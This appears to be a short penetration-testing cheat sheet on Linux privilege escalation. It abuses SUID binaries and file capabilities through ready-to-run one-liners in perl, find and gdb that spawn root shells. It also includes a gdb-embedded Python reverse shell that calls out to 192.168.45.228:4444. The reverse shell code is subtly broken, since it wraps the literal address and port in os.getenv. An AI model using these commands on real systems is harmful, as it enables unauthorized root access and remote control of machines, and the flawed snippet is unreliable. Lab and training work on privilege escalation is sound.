#### Abusing SUID
ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
               ^
               
The s bit is set.


Enumerate capable binaries: 
/usr/sbin/getcap -r / 2>/dev/null

Check any binaries that have setuid capabilities on GTFOBins.

Two examples of this abuse:

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

find /home/joe/Desktop -exec "/usr/bin/bash" -p \;

Attack gdb:
Shell:
gdb -nx -ex '!sh' -ex quit

Reverse Shell:
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("192.168.45.228"),int(os.getenv("4444"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' -ex quit

Capabilties:
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit

